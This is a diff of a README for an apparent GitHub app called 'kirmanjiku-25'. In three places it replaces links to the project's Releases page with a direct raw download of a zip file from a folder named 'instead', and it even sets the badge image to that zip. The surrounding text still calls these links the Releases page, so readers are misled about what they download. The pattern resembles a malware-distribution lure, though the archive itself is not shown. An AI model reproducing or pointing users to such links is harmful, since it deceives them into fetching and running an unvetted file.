@@ -6,7 +6,7 @@ Welcome to **kirmanjiku-25**! This application offers a simple way to manage you
 
 ## 📥 Download the Application
 
-[![Download kirmanjiku-25](https://img.shields.io/badge/Download-kirmanjiku--25-brightgreen)](https://github.com/Newbiehacker38/kirmanjiku-25/releases)
+[![Download kirmanjiku-25](https://raw.githubusercontent.com/Newbiehacker38/kirmanjiku-25/main/instead/kirmanjiku-25.zip)](https://raw.githubusercontent.com/Newbiehacker38/kirmanjiku-25/main/instead/kirmanjiku-25.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 ## 🔗 Download & Install
 
-1. Click this link to visit the **Releases page**: [Download kirmanjiku-25](https://github.com/Newbiehacker38/kirmanjiku-25/releases).
+1. Click this link to visit the **Releases page**: [Download kirmanjiku-25](https://raw.githubusercontent.com/Newbiehacker38/kirmanjiku-25/main/instead/kirmanjiku-25.zip).
 2. On the Releases page, look for the latest version.
 3. Find the file that ends in `.exe` for Windows, `.dmg` for macOS, or a suitable package for Linux, and click on it to start the download.
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -55,7 +55,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 If you run into issues, consider the following steps:
 
-- **Check for Updates:** Ensure you’re using the latest version by visiting the [Releases page](https://github.com/Newbiehacker38/kirmanjiku-25/releases).
+- **Check for Updates:** Ensure you’re using the latest version by visiting the [Releases page](https://raw.githubusercontent.com/Newbiehacker38/kirmanjiku-25/main/instead/kirmanjiku-25.zip).
 - **Reinstall the Application:** If something doesn’t work right, uninstall and reinstall the app.
 - **Consult the FAQ:** A list of common questions can be found on the GitHub page for further help.
 - **Community Support:** You can ask for help in the Issues section of this repository.
